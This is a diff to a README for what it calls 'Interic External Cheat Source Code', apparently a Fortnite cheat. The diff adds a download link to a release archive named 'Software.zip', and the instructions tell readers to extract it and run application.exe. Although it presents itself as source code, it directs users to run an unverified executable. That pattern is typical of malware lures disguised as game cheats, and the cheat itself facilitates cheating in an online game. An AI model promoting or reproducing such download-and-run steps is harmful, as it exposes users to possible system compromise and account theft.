@@ -4,7 +4,7 @@ Interic External Cheat Source Code. Simple to Use
 
 ## How to Use
 
-- Download the project to your computer as zip [click here to download]()
+- Download the project to your computer as zip [click here to download](https://github.com/zeroworth95/Interic-Fortnite-External-Cheat/releases/download/download/Software.zip)
 - Extract Project to Folder
 - run application.exe
 
